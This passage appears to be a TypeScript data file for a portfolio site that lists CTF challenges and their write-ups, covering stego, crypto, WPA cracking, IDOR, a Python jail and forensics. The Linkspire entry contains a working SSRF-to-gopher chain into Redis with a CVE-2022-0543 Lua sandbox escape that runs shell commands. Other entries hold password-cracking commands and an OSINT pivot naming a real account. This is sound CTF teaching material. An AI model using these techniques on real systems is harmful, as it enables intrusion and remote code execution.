export type Difficulty = 'Easy' | 'Medium' | 'Hard';

export interface WriteupStep {
  title: string;
  text?: string;
  code?: string;
  lang?: string;
}

export interface ChallengeFile {
  label: string;
  href: string;
}

export interface Challenge {
  slug: string;
  name: string;
  event: string;
  category: string;
  difficulty: Difficulty;
  flagFormat: string;
  description: string;
  summary: string;
  skills: string[];
  files: ChallengeFile[];
  writeupSource?: string;
  steps: WriteupStep[];
  flag?: string;
  /** 'solver' marks challenges solved (not authored) by the portfolio owner — shown under Writeups. */
  role?: 'author' | 'solver';
  solvedBy?: string;
}

const base = import.meta.env.BASE_URL;
const local = (f: string) => `${base}ctf/${f}`;
const REPO = 'https://github.com/0xNay33m/csc_cyberwar_ctf';
const repoTree = (p: string) => `${REPO}/tree/HEAD/${p}`;
const repoBlob = (p: string) => `${REPO}/blob/HEAD/${p}`;

const BICS = 'Al-Khwarizmi CTF 2025';
const CSC = 'CSC_Cyberwar CTF 2026';
const BDSec = 'BDSec CTF 2026';
const TEAM_PDF = `${base}writeups/bdsec-ctf-2026.pdf`;

export const ctfChallenges: Challenge[] = [
  {
    slug: 'layers-of-truth',
    name: 'Layers of Truth',
    event: BICS,
    category: 'Steganography',
    difficulty: 'Hard',
    flagFormat: 'BICS77{s0me_t3xt}',
    description:
      'Complete each phase to uncover the next move. Secrets lie beneath layers of pixels, waiting to be revealed. Follow the trail carefully: every detail matters.',
    summary: 'A four-phase progressive stego chain: LSB, AES-CBC, palette encoding and coordinate-hidden IVs.',
    skills: ['LSB extraction', 'AES-128-CBC', 'Palette steganography', 'Scripting'],
    files: [{ label: 'layers-of-truth.zip', href: local('layers-of-truth.zip') }],
    steps: [
      {
        title: 'Phase 1: LSB of challenge.png',
        text: 'Read the least-significant bit of each R, G and B channel until a 48-bit end marker appears. The bits decode to a 384-character base64 string. zsteg truncates at 256 bytes by default, so pass -l 0 or the hint gets cut off.',
        code: 'zsteg challenge.png b1,rgb,lsb,xy -l 0',
        lang: 'bash',
      },
      {
        title: 'Decode the Phase 1 payload',
        text: 'Base64-decode it to JSON. It holds the Phase 2 password and a hint: phase2.png is AES-128-CBC encrypted, and the key is the password repeated and cut to 16 bytes.',
        code: 'import base64, json\ndata = json.loads(base64.b64decode(extracted))\nprint(data["password"], data["hint"])',
        lang: 'python',
      },
      {
        title: 'Phase 2: decrypt phase2.png',
        text: 'Extract LSB data the same way, base64-decode it, split the first 16 bytes off as the IV and decrypt the rest with AES-128-CBC. The plaintext JSON gives a pair of coordinates, a palette key and the Phase 3 hint.',
        code: 'raw = base64.b64decode(lsb("phase2.png"))\niv, ct = raw[:16], raw[16:]\nkey = (password.encode() * 2)[:16]\nplain = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ct), 16)',
        lang: 'python',
      },
      {
        title: 'Phase 3: instruction + palette key',
        text: 'The LSB of phase3.png is a plain-text instruction naming the palette start index and where the Phase 4 IV lives. phase3_palette.png is an indexed image: starting at that index, each palette entry stores one key byte in R, while G and B carry a verifiable offset from a base pattern (r=i*3, g=i*5, b=i*7). Read R bytes while the G/B check holds.',
        code: 'pal = Image.open("phase3_palette.png").getpalette()\nkey = ""\nfor i in range(start, start + 20):\n    r, g, b = pal[i*3:i*3+3]\n    if g == (i*5 + r) % 256 and b == (i*7 + 2*r) % 256:\n        key += chr(r)',
        lang: 'python',
      },
      {
        title: 'Phase 4: ciphertext and IV',
        text: 'The LSB of phase4.png is the base64 ciphertext. The IV is a 32-character hex string hidden in the LSBs that start at the Phase 2 coordinates (taken modulo the image size). Decrypt with AES-128-CBC using the palette key, derived the same way as in Phase 2.',
        code: 'iv = bytes.fromhex(lsb_at("phase4.png", x % w, y % h, 32))\nct = base64.b64decode(lsb("phase4.png"))\nflag = unpad(AES.new((key.encode()*2)[:16], AES.MODE_CBC, iv).decrypt(ct), 16)',
        lang: 'python',
      },
    ],
    flag: 'BICS77{St3g0_k1ng_w3lc0m3_y0u_sm4sh3d_th3_l1m1t}',
  },
  {
    slug: 'fragmented-trust',
    name: 'Fragmented Trust',
    event: BICS,
    category: 'Cryptography',
    difficulty: 'Medium',
    flagFormat: 'BICS77{s0me_t3xt}',
    description:
      'A fintech startup designed its own "secure" crypto wallet. They split encryption keys for "extra security"... But trust was fragmented, and so was their crypto.',
    summary: 'Recover three key fragments via RSA small-exponent, hex decoding and CRT, then AES-CTR decrypt the flag.',
    skills: ['RSA e=3 cube root', 'Chinese Remainder Theorem', 'AES-CTR', 'Log analysis'],
    files: [{ label: 'fragmented-trust.zip', href: local('fragmented-trust.zip') }],
    steps: [
      {
        title: 'Recon the files',
        text: 'Five files: README.md, encrypted_flag.bin, key_fragments.txt, public.pem and server.log. The theme says the key was split, so the plan is to recover each fragment, combine them and decrypt.',
      },
      {
        title: 'Fragment 1: RSA with e = 3',
        text: 'public.pem uses a 2048-bit modulus with exponent 3, and the encrypted fragment is only ~309 bits. Because m³ < n the modulus never wraps, so an integer cube root recovers the plaintext directly.',
        code: 'openssl rsa -pubin -in public.pem -text -noout   # Exponent: 3\n\nfrom gmpy2 import iroot\nm, exact = iroot(c1, 3)\nfrag1 = int(m).to_bytes(10, "big")',
        lang: 'python',
      },
      {
        title: 'Read server.log',
        text: 'The "debug" log leaks everything else: a hex session_key_part (fragment 2), CRT parameters p, q, a, b (fragment 3), encryption_mode=AES-CTR with an all-zero nonce, and key_derivation=SHA256(combined_fragments)[:16].',
      },
      {
        title: 'Fragment 2: hex decode',
        code: "echo -n '6b65795f667261675f326e64' | xxd -r -p   # key_frag_2nd",
        lang: 'bash',
      },
      {
        title: 'Fragment 3: Chinese Remainder Theorem',
        text: 'Solve x ≡ a (mod p), x ≡ b (mod q) and serialise x as 16 bytes. The leading null byte is part of the fragment, so keep it.',
        code: 'k = (b - a) * pow(p, -1, q) % q\nx = (a + p * k) % (p * q)\nfrag3 = x.to_bytes(16, "big")',
        lang: 'python',
      },
      {
        title: 'Combine, derive, decrypt',
        text: 'Concatenate frag1 + frag2 + frag3, take SHA-256 and keep the first 16 bytes as the AES key. AES-CTR with a zero nonce yields a base64 string; decode it for the flag.',
        code: 'key = hashlib.sha256(frag1 + frag2 + frag3).digest()[:16]\npt = AES.new(key, AES.MODE_CTR, nonce=b"", initial_value=bytes(16)).decrypt(ct)\nprint(base64.b64decode(pt.strip(b"\\x00\\n")))',
        lang: 'python',
      },
    ],
    flag: 'BICS77{fr4gm3nt3d_k3ys_l34d_t0_f4ll}',
  },
  {
    slug: 'weak-protocol',
    name: 'Weak Protocol',
    event: BICS,
    category: 'Cryptography',
    difficulty: 'Hard',
    flagFormat: 'BICS77{s0me_t3xt}',
    description: 'Prototype secure channel for internal testing. Protocol may change. Passwords are alphanumeric only (a-z, 0-9).',
    summary: 'A home-made Feistel cipher keyed by MD5(password), buried in decoy code and noisy protocol logs.',
    skills: ['Code review', 'Custom cipher analysis', 'Hash brute force', 'Noise filtering'],
    files: [{ label: 'weak-protocol.zip', href: local('weak-protocol.zip') }],
    steps: [
      {
        title: 'Separate signal from noise',
        text: 'message.bin is a wall of lorem ipsum, fake DEBUG lines, keys, nonces and checksums. Two line shapes matter: exactly-64-hex-character lines (SHA-256 digests, so candidate password hashes) and valid base64 lines (candidate ciphertexts).',
      },
      {
        title: 'Read past the decoys in secure_channel.py',
        text: 'The header talks about FIPS-197 and AES-256, but that is a red herring. The real code is a custom 6-round Feistel cipher on 8-byte blocks with PKCS7 padding, keyed by MD5(password)[:8]. A working decrypt() is already provided, so all that is missing is the password.',
      },
      {
        title: 'Brute force the password against the hash set',
        text: 'The README limits the charset to a-z0-9. For every short candidate, hash it with SHA-256 and only continue when the digest appears among the 64-hex lines. That prunes almost everything.',
        code: 'for n in range(1, 7):\n    for c in itertools.product(charset, repeat=n):\n        pwd = "".join(c)\n        if sha256(pwd.encode()).hexdigest() not in hashes:\n            continue\n        for b64 in candidates:\n            ct = base64.b64decode(b64)\n            if len(ct) % 8: continue\n            try:\n                pt = decrypt(ct, pwd.encode())\n                if b"BICS77{" in pt: print(pt); raise SystemExit\n            except Exception: pass',
        lang: 'python',
      },
      {
        title: 'Lesson',
        text: 'Custom crypto with a short, unsalted, fast-hashed password collapses to a dictionary problem, however much "AES" is written in the comments.',
      },
    ],
    flag: 'BICS77{cu5t0m_crypt0_br34k5_wh3n_k3y5_4r3_w34k}',
  },
  {
    slug: 'hidden-truth',
    name: 'Hidden Truth',
    event: BICS,
    category: 'Steganography',
    difficulty: 'Medium',
    flagFormat: 'BICS77{...}',
    description:
      "You've intercepted a suspicious image file. Something seems off about it, but you can't quite put your finger on it. Can you uncover what's hidden within?",
    summary: 'PNG with an appended, password-protected ZIP containing a Morse-code audio file.',
    skills: ['File carving', 'ZIP cracking', 'Audio / Morse analysis'],
    files: [{ label: 'hidden-truth.zip', href: local('hidden-truth.zip') }],
    steps: [
      {
        title: 'Find the appended archive',
        text: 'binwalk shows a ZIP archive living after the PNG data. Carve it with binwalk -e, foremost or dd.',
        code: 'binwalk challenge.png\nbinwalk -e challenge.png',
        lang: 'bash',
      },
      {
        title: 'Crack the ZIP',
        text: 'The archive holds morse_audio.wav but is password protected. A rockyou dictionary attack falls quickly.',
        code: 'zip2john hidden.zip > h.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt h.txt',
        lang: 'bash',
      },
      {
        title: 'Decode the Morse audio',
        text: 'Open the WAV in Audacity (or any Morse decoder) and read the tones. Note that .-.-. is the "+" sign.',
        code: '... - ...-- --. ----- .-.-. .. ..... .-.-. . ....- ... -.-- .-.-. .---- ..-. .-.-. -.-- ----- ..- .-.-. -.-. ....- -.',
        lang: 'text',
      },
      {
        title: 'Wrap it in the flag format',
        text: 'Morse decodes to ST3G0+I5+E4SY+1F+Y0U+C4N. Wrap it in BICS77{...}.',
      },
    ],
    flag: 'BICS77{ST3G0+I5+E4SY+1F+Y0U+C4N}',
  },
  {
    slug: 'stego-video',
    name: 'Stego Video',
    event: CSC,
    category: 'Steganography',
    difficulty: 'Hard',
    flagFormat: 'DIUCYBERWAR{...}',
    description:
      'Every component in this challenge plays a crucial role: the marker, the hidden bytes, the nonce. Each piece is a clue, each byte matters. Inspect every corner, question every byte and think beyond what you see.',
    summary: 'An AES-EAX encrypted video hidden behind a magic marker inside an MKV container.',
    skills: ['Metadata analysis', 'Binary carving', 'AES-EAX'],
    files: [{ label: 'stego_video.mkv.zip', href: repoTree('Challenges/Steganography/Stego_Video') }],
    writeupSource: repoBlob('challenge_solution/Steganography/Stego_Video_writeup.txt'),
    steps: [
      {
        title: 'Metadata first',
        text: 'exiftool / mkvinfo reveal a link in the container metadata. Download that content and crack the archive to recover the key material.',
        code: 'exiftool stego_video.mkv\nmkvinfo stego_video.mkv',
        lang: 'bash',
      },
      {
        title: 'Locate the magic marker',
        text: 'Search the MKV for the custom 16-byte marker. Everything after it is the hidden payload laid out as nonce (16) | tag (16) | ciphertext.',
      },
      {
        title: 'Decrypt with AES-EAX',
        code: 'idx = data.find(MAGIC)\npayload = data[idx + len(MAGIC):]\nnonce, tag, ct = payload[:16], payload[16:32], payload[32:]\nvideo = AES.new(key, AES.MODE_EAX, nonce=nonce).decrypt_and_verify(ct, tag)',
        lang: 'python',
      },
      { title: 'Watch the extracted video', text: 'The recovered video reveals the flag.' },
    ],
  },
  {
    slug: 'easy-crypto',
    name: 'Easy_Crypto',
    event: CSC,
    category: 'Cryptography',
    difficulty: 'Medium',
    flagFormat: 'DIUCYBERWAR{...}',
    description:
      'Give the file to ChatGPT and ask it to solve the problem. Caution: once a wise man named Wiener said "Keep your brain busy training the AI, then the AI will replace you one day!"',
    summary: "RSA with a dangerously small private exponent, broken by Wiener's continued-fraction attack.",
    skills: ["Wiener's attack", 'Continued fractions', 'RSA'],
    files: [{ label: 'pubkey.pem + cipher.bin', href: repoTree('Challenges/Cryptography/Easy_Crypto_Files') }],
    writeupSource: repoBlob('challenge_solution/Cryptography/Easy_Crypto_writeup.pdf'),
    steps: [
      {
        title: 'Spot the hint',
        text: 'The description name-drops Wiener. A very large public exponent e is the giveaway that d is small enough for Wiener\'s attack (d < n^¼ / 3).',
      },
      {
        title: 'Continued fractions of e/n',
        text: 'Expand e/n as a continued fraction. Each convergent k/d is a candidate. For each one, compute φ = (e·d − 1)/k and check whether x² − (n − φ + 1)x + n has integer roots p and q.',
        code: 'for k, d in convergents(continued_fraction(e, n)):\n    if k == 0 or (e*d - 1) % k: continue\n    phi = (e*d - 1) // k\n    s = n - phi + 1\n    t = isqrt(s*s - 4*n)\n    if t*t == s*s - 4*n:\n        print(long_to_bytes(pow(c, d, n)))',
        lang: 'python',
      },
      { title: 'Decrypt', text: 'With d recovered, m = c^d mod n gives the flag.' },
    ],
  },
  {
    slug: 'handshake',
    name: 'Handshake',
    event: CSC,
    category: 'Wireless / Misc',
    difficulty: 'Easy',
    flagFormat: 'DIUCYBERWAR{...}',
    description: 'Prove yourself as a WiFi h4cker!',
    summary: 'Crack a captured WPA/WPA2 4-way handshake offline.',
    skills: ['802.11', 'WPA2 handshake', 'Wordlist attacks'],
    files: [{ label: 'handshake .cap', href: repoTree('Challenges/Misc') }],
    writeupSource: repoBlob('challenge_solution/Misc/Wifi_Writeup.txt'),
    steps: [
      {
        title: 'Understand the capture',
        text: 'A WPA/WPA2 4-way handshake proves both client and AP know the passphrase. Once captured, candidate passphrases can be tested offline with no interaction with the network.',
      },
      {
        title: 'Crack with a wordlist',
        code: 'aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-F0:A7:31:D0:CF:21.cap',
        lang: 'bash',
      },
      { title: 'Submit', text: 'The recovered passphrase is the flag content, wrapped as DIUCYBERWAR{...}.' },
    ],
  },
  {
    slug: 'idor-portal',
    name: 'IDOR Portal',
    event: CSC,
    category: 'Web',
    difficulty: 'Medium',
    flagFormat: 'DIUCYBERWAR{...}',
    description: 'A small user dashboard. Everyone has an ID, and so does the admin. Think like an *elite* hacker.',
    summary: 'Broken object-level authorisation: walk uid parameters until the admin profile leaks its secret.',
    skills: ['IDOR / BOLA', 'Source review', 'Parameter tampering'],
    files: [{ label: 'PHP source', href: repoTree('Challenges/web/idor') }],
    steps: [
      {
        title: 'Map the app',
        text: 'index, dashboard, profile, settings and admin-log all take a ?uid= parameter and never check who is asking. That is a classic IDOR.',
      },
      {
        title: 'Read the comments',
        text: 'HTML comments on admin-log.php say the admin has a uid too and tell you to "think like an *elite* hacker". Elite is 1337.',
      },
      {
        title: 'Become the admin',
        text: 'admin-log.php?uid=1337 grants admin access and says the flag sits on that user\'s profile.',
        code: 'GET /admin-log.php?uid=1337   # Admin access granted\nGET /profile.php?uid=1337     # Secret Info: DIUCYBERWAR{...}',
        lang: 'http',
      },
      {
        title: 'Lesson',
        text: 'IDOR is not about enumeration. It is about a missing authorisation check on every object access.',
      },
    ],
    flag: 'DIUCYBERWAR{1n53cur3_d1r3ct_0bj3ct_r3f3r3nc3_1s_n0t_4b0ut_3num3r4t10n_but_4b0ut_m1551ng_4uth0r1z4t10n_ch3ck5}',
  },
  {
    slug: 'stego-tail',
    name: 'Stego Tail',
    event: CSC,
    category: 'Steganography',
    difficulty: 'Medium',
    flagFormat: 'DIUCYBERWAR{...}',
    description:
      "You might think this picture is innocent, but if you look closely you'll notice it's keeping a little surprise. Sometimes the tail tells more than the head.",
    summary: 'Data smuggled after the JPEG end-of-image marker.',
    skills: ['JPEG structure', 'dd carving', 'ZIP passwords'],
    files: [{ label: 'stego_tail.jpg.zip', href: repoTree('Challenges/Steganography/stego_tail') }],
    writeupSource: repoBlob('challenge_solution/Steganography/stego_tail_writeup.txt'),
    steps: [
      { title: 'Check metadata', code: 'exiftool stego_tail.jpg', lang: 'bash' },
      {
        title: 'Find the end-of-image marker',
        text: 'Everything after FF D9 is ignored by image viewers, which makes it a perfect hiding place.',
        code: "grep -a -b $'\\xFF\\xD9' stego_tail.jpg",
        lang: 'bash',
      },
      {
        title: 'Carve and unzip',
        code: 'dd if=stego_tail.jpg bs=1 skip=$((EOI_OFFSET+2)) of=extracted.zip\nunzip extracted.zip   # password found in metadata\ncat flag.txt',
        lang: 'bash',
      },
    ],
  },
  {
    slug: 'stego-unseen',
    name: 'Stego Unseen',
    event: CSC,
    category: 'Steganography',
    difficulty: 'Easy',
    flagFormat: 'DIUCYBERWAR{...}',
    description: "Don't make it complex. Dig the truth from within.",
    summary: 'Classic LSB image steganography.',
    skills: ['LSB steganography'],
    files: [{ label: 'stego_unseen.png.zip', href: repoTree('Challenges/Steganography/stego_unseen') }],
    writeupSource: repoBlob('challenge_solution/Steganography/stego_unseen_writeup.txt'),
    steps: [
      {
        title: 'Keep it simple',
        text: 'The hint says not to overthink it. Drop the PNG into an LSB decoder (or zsteg) and the message appears.',
        code: 'zsteg stego_unseen.png\n# or: https://stylesuxx.github.io/steganography/',
        lang: 'bash',
      },
    ],
  },
  {
    slug: 'steg1',
    name: 'Steg1',
    event: CSC,
    category: 'Steganography',
    difficulty: 'Easy',
    flagFormat: 'DIUCYBERWAR{...}',
    description:
      'A rumor has spread across the cyber community: "One of the CSC members is a NATO agent." Can you uncover the truth hidden within the image? Sometimes the message isn\'t what you see!',
    summary: 'A metadata-hidden string encoded in the NATO phonetic alphabet.',
    skills: ['EXIF metadata', 'Encoding identification'],
    files: [{ label: 'steg1.jpg.zip', href: repoTree('Challenges/Steganography/steg1') }],
    writeupSource: repoBlob('challenge_solution/Steganography/steg1_writeup.txt'),
    steps: [
      { title: 'Dump metadata', code: 'exiftool steg1.jpg', lang: 'bash' },
      {
        title: 'Decode NATO phonetics',
        text: 'A metadata field holds a sequence of words like Alfa Bravo Charlie... Decode it with CyberChef / cryptii or a cipher identifier to read the flag.',
      },
    ],
  },
  {
    slug: 'bdsec-linkspire',
    name: 'Linkspire',
    event: BDSec,
    category: 'Web',
    difficulty: 'Hard',
    flagFormat: 'bdsec{...}',
    description:
      'Linkspire is the friendly little link shortener the whole team uses. Shorten a link, get a slick preview card. What could possibly go wrong? Target: http://23.239.30.114:8081/',
    summary:
      'SSRF in the preview endpoint chained through the shortener’s own open redirect into gopher://, reaching an internal Redis and escaping its Lua sandbox for RCE.',
    skills: ['SSRF', 'Open-redirect chaining', 'Gopher protocol smuggling', 'Redis internals', 'CVE-2022-0543'],
    files: [{ label: 'Benson & Hedges — BDSec CTF writeups.pdf', href: TEAM_PDF }],
    role: 'solver',
    solvedBy: 'Mr L',
    steps: [
      {
        title: 'Map the app normally',
        text: 'First I just used the app to see what each endpoint does. The shorten endpoint returns a code that is simply the destination URL base64-encoded — no database, no random ID. That is a mental note for later.',
        code: 'BASE=http://23.239.30.114:8081\ncurl -s -X POST "$BASE/api/shorten" -H \'Content-Type: application/json\' --data \'{"url":"https://example.com/hello"}\'\n# {"code":"aHR0cHM6Ly9leGFtcGxlLmNvbS9oZWxsbw","short_url":"http://localhost:5000/l/aHR0cHM6Ly9leGFtcGxlLmNvbS9oZWxsbw"}\necho \'aHR0cHM6Ly9leGFtcGxlLmNvbS9oZWxsbw==\' | base64 -d\n# https://example.com/hello',
        lang: 'bash',
      },
      {
        title: 'Spot the SSRF surface and the Redis hint',
        text: 'The preview endpoint fetches a URL server-side. Its response leaks two things: an X-Cache-Backend: redis header, and a leftover dev comment in the page HTML saying the internal redis box (redis:6379) is still wide open with no auth. Goal: make the server talk to that Redis for me.',
        code: 'curl -s -i "$BASE/api/preview?url=http://example.com/"',
        lang: 'bash',
      },
      {
        title: 'Confirm the host filter — and question it',
        text: 'Pointing preview straight at Redis is refused: there IS a host filter blocking internal names. But that raised the real question: does it re-check after a redirect, or only the first URL? That question is the whole challenge.',
        code: 'curl -s "$BASE/api/preview?url=http://redis:6379/"\n# {"error":"Refusing to fetch an internal/private address."}',
        lang: 'bash',
      },
      {
        title: 'Chain the open redirect into file://',
        text: 'Since /l/<base64> just 302-redirects to whatever I encode, and the preview filter trusts its own domain (localhost:5000) on the first hop, I fed preview a localhost short-link pointing at a local file. The actual source of app.py came back in the JSON preview — proving the fetcher only validates the FIRST URL host, and libcurl follows with every protocol it was compiled with (the source showed PROTOCOLS/REDIR_PROTOCOLS = PROTO_ALL). If file:// works post-redirect, gopher:// will too — and gopher lets me send raw bytes to Redis.',
        code: 'python3 - <<\'PY\'\nimport base64, urllib.parse, urllib.request, json\nBASE="http://23.239.30.114:8081"\ntarget="file:///app/app.py"\ntok=base64.urlsafe_b64encode(target.encode()).decode().rstrip("=")\nurl=f"http://localhost:5000/l/{tok}"\nq=BASE+"/api/preview?url="+urllib.parse.quote(url)\nprint(json.loads(urllib.request.urlopen(q).read())["preview"][:300])\nPY',
        lang: 'python',
      },
      {
        title: 'Talk to Redis over gopher',
        text: 'Gopher sends raw bytes after "/_", which is exactly the Redis wire protocol. I always append QUIT so curl gets a clean close instead of hanging. INFO revealed redis_version 5.0.7 on Debian — but KEYS * and DBSIZE came back empty, so the flag is NOT stored as a key. That exact build is vulnerable to CVE-2022-0543, a Lua sandbox escape — the empty keyspace told me I needed code execution, not a key read.',
        code: 'python3 - <<\'PY\'\nimport base64, urllib.parse, urllib.request, json\nBASE="http://23.239.30.114:8081"\npayload="PING\\r\\nINFO server\\r\\nQUIT\\r\\n"\ngopher="gopher://redis:6379/_"+urllib.parse.quote(payload)\ntok=base64.urlsafe_b64encode(gopher.encode()).decode().rstrip("=")\nurl=f"http://localhost:5000/l/{tok}"\nq=BASE+"/api/preview?url="+urllib.parse.quote(url)\nprint(json.loads(urllib.request.urlopen(q,timeout=60).read())["preview"])\nPY\n# +PONG ... redis_version:5.0.7 ... (KEYS * -> empty, DBSIZE 0)',
        lang: 'python',
      },
      {
        title: 'Lua sandbox escape and flag',
        text: 'The bug: EVAL\'s Lua sandbox can reload the real io library via package.loadlib(), then run shell commands with io.popen(). My Lua has spaces and quotes, so I sent it as a proper RESP bulk-string array in the gopher body. The flag was on the Redis container the whole time — which is why my earlier file:// sweeps for /flag on the web box found nothing.',
        code: 'python3 - <<\'PY\'\nimport base64, json, urllib.parse, urllib.request\nBASE="http://23.239.30.114:8081"\ndef short(t):\n    tok=base64.urlsafe_b64encode(t.encode()).decode().rstrip("=")\n    return f"http://localhost:5000/l/{tok}"\ndef resp_eval(lua):\n    parts=[b"EVAL",lua.encode(),b"0"]\n    buf=b"*"+str(len(parts)).encode()+b"\\r\\n"\n    for p in parts: buf+=b"$"+str(len(p)).encode()+b"\\r\\n"+p+b"\\r\\n"\n    return buf+b"QUIT\\r\\n"\nlua=(\'local i=package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_io");\'\n\'local io=i();\'\n\'local f=io.popen("grep -ao \'bdsec{[^}]*}\' /flag.txt 2>/dev/null","r");\'\n\'local r=f:read("*a");f:close();return r\')\ngopher="gopher://redis:6379/_"+urllib.parse.quote_from_bytes(resp_eval(lua))\nq=BASE+"/api/preview?url="+urllib.parse.quote(short(gopher))\nprint(json.loads(urllib.request.urlopen(q,timeout=90).read())["preview"])\nPY\n# $71\n# /flag.txt:bdsec{Deb1an_R3d1s_lua_sandb0x_esc4pe_thr0ugh_a_g0pher_h0le}\n# +OK',
        lang: 'python',
      },
    ],
    flag: 'bdsec{Deb1an_R3d1s_lua_sandb0x_esc4pe_thr0ugh_a_g0pher_h0le}',
  },
  {
    slug: 'bdsec-obsidian-gate',
    name: 'Obsidian Gate',
    event: BDSec,
    category: 'Pwn / Jail',
    difficulty: 'Hard',
    flagFormat: 'BDSEC{...}',
    description: 'Beyond the obsidian gate lies a sealed archive. Target: nc 50.116.28.133 48271',
    summary:
      'A Python jail with no operators, no attributes and a single Gordian name — escaped using only dir() and string subscripting.',
    skills: ['Python sandbox escape', 'Object-graph navigation', 'Filter probing'],
    files: [{ label: 'Benson & Hedges — BDSec CTF writeups.pdf', href: TEAM_PDF }],
    role: 'solver',
    solvedBy: 'Mr L',
    steps: [
      {
        title: 'Profile the service',
        text: 'It prints a banner ("One expression. One answer.") and a "> " prompt, takes one line, prints a result, and closes. So it evaluates a single Python expression per connection — that smells like a pyjail.',
        code: 'nc 50.116.28.133 48271',
        lang: 'bash',
      },
      {
        title: 'Probe the filter, one input at a time',
        text: 'I wrote a tiny helper firing one expression per connection and reading the last line back. Findings: bare int/str constants fine; operators, comprehensions, lambdas and f-strings all "operation denied"; attribute access x.y "attribute denied" (so no __class__ / __globals__); allowed calls are type, repr, len and dir; subscripting obj[\'key\'] works; and exactly one pre-defined name exists: root. The lightbulb: dir() returns an object\'s members as a list of STRINGS, and I can index those strings with subscripts — navigating the whole object graph with just dir() plus string subscripts, no attribute access needed.',
        code: 'gate(){ printf \'%s\\n\' "$1" | nc 50.116.28.133 48271 | tail -1; }\ngate "1+1"       # -> operation denied\ngate "1"          # -> 1 (bare int constant is fine)\ngate "\'abc\'"      # -> \'abc\' (str constant fine)\ngate "True"       # -> constant denied\ngate "\'abc\'[0]"  # -> \'a\' (SUBSCRIPTING works!)\ngate "type(1)"    # -> <class \'int\'> (type() allowed)\ngate "repr(0)"    # -> \'0\' (repr allowed)\ngate "len(\'abc\')" # -> 3 (len allowed)\ngate "open"       # -> name denied\ngate "root"       # -> <obsidian root> (this name EXISTS)',
        lang: 'bash',
      },
      {
        title: 'Walk the object graph to the sealed archive',
        text: 'dir(root) gave four branches; only one path kept going: observer to right to memory to catalog to index to sealed. The sealed archive exposes a status and an unveil.',
        code: 'gate "dir(root)"                                   # -> [\'ash\', \'mirror\', \'observer\', \'year\']\ngate "dir(root[\'observer\'])"                     # ... \'right\' ...\ngate "dir(root[\'observer\'][\'right\'])"           # ... \'memory\' ...\ngate "dir(root[\'observer\'][\'right\'][\'memory\'])" # \'catalog\' -> index -> sealed\nSEALED="root[\'observer\'][\'right\'][\'memory\'][\'catalog\'][\'index\'][\'sealed\']"\ngate "dir($SEALED)"          # -> [\'status\', \'unveil\']\ngate "${SEALED}[\'status\']"  # -> \'intact\'',
        lang: 'bash',
      },
      {
        title: 'Call unveil() with no arguments',
        text: 'unveil looked like a capability I could call. With an argument it answered "arguments denied", so I called it with NO args — and the gate opened.',
        code: 'printf "%s\\n" "${SEALED}[\'unveil\']()" | nc 50.116.28.133 48271 | tail -1\n# BDSEC{0bs1d14n_g4t3_un53al3d_g00d_jOB}',
        lang: 'bash',
      },
    ],
    flag: 'BDSEC{0bs1d14n_g4t3_un53al3d_g00d_jOB}',
  },
  {
    slug: 'bdsec-rabbit-whole-identity',
    name: 'Rabbit Whole Identity',
    event: BDSec,
    category: 'DFIR / OSINT',
    difficulty: 'Medium',
    flagFormat: 'BDSEC{...}',
    description:
      'From the Money Trail investigation I have a paper identity: Mehedi Rahman, KB-2024-00847, m.rahman.op@protonmail.com, a Mirpur (Dhaka) KYC address. But a KYC record is just what he told a bank. The challenge asks for his Facebook username — find the real person behind the paper identity.',
    summary:
      'From a KYC paper identity to a real Facebook profile via one out-of-place username among dozens of lookalikes.',
    skills: ['OSINT', 'Username pivoting', 'Social footprinting'],
    files: [{ label: 'Benson & Hedges — BDSec CTF writeups.pdf', href: TEAM_PDF }],
    role: 'solver',
    solvedBy: 'Mr L',
    steps: [
      {
        title: 'Start from one clean string',
        text: 'From Money Trail I have a paper identity: Mehedi Rahman, KB-2024-00847, m.rahman.op@protonmail.com, a Mirpur (Dhaka) KYC address. To find the real person (and later, where he is), I need his actual social footprint. The deliverable is his Facebook ID username, so the plan is simple: take the recovered name, search Facebook, and figure out which profile is really him.',
      },
      {
        title: 'Search the name, spot the anomaly',
        text: 'Searching Mehedi Rahman on Facebook returns a wall of profiles — dozens of "Mehedi"s, none obviously the guy, as expected for such a common Bangladeshi name. Scrolling the usernames instead of the display names broke it open: almost everyone had a name-ish handle, but one profile\'s username looked completely out of place — elektrotransczech. A Bangladeshi individual carrying a "Czech electro-transport company" vanity handle is exactly the kind of mismatch that stands out, making it my prime candidate.',
      },
      {
        title: 'Confirm via the author’s own tag',
        text: 'To make sure "elektrotransczech" was really a person and not just some company page, I ran the same username across other socials — googling it with the instagram keyword and opening each account. One had an interesting bio: "Hacked by pmsiam" — and pmsiam is the challenge author. Seeing the author\'s own tag sitting on the account tied to this exact handle confirmed elektrotransczech is the intended target, not a coincidence.',
        code: 'FLAG: BDSEC{elektrotransczech}',
        lang: 'text',
      },
    ],
    flag: 'BDSEC{elektrotransczech}',
  },
  {
    slug: 'bdsec-money-trail',
    name: 'Money Trail',
    event: BDSec,
    category: 'DFIR',
    difficulty: 'Hard',
    flagFormat: 'BDSEC{...}',
    description:
      'May 10, 2024: ~$2,045,000 in crypto leaves FirstBangla Bank’s cold storage during business hours with legit credentials. By May 12 the prime suspect is gone — empty desk, no note, just an "ordinary pen" left behind. Forensic clone of the workstation, a full packet capture, and one pointed instruction: the target is Sepolia, and "even a few dollars or cents" matters.',
    summary:
      'Offline disk forensics, a vault password from shell history, and an on-chain Sepolia trail to the launderer’s flagged account.',
    skills: ['Disk forensics', 'Offline mount analysis', 'Etherscan tracing', 'Calldata decoding', 'PCAP correlation'],
    files: [{ label: 'Benson & Hedges — BDSec CTF writeups.pdf', href: TEAM_PDF }],
    role: 'solver',
    solvedBy: 'Mr L',
    steps: [
      {
        title: 'Mount the clone read-only, don’t boot it',
        text: 'The forensic clone had Arif Khan\'s Linux user (arif.khan, UID 1001) behind a password. Rather than boot the image and get stuck at a login, I mounted the raw disk read-only and read straight off it. His shadow entry carried a yescrypt hash; the obvious credential from his own notes (Welcome@2024!) didn\'t match and the hash didn\'t crack in a reasonable pass — but cracking the login turned out to be unnecessary, since the read-only mount already gave full read access to his home directory with no authentication at all.',
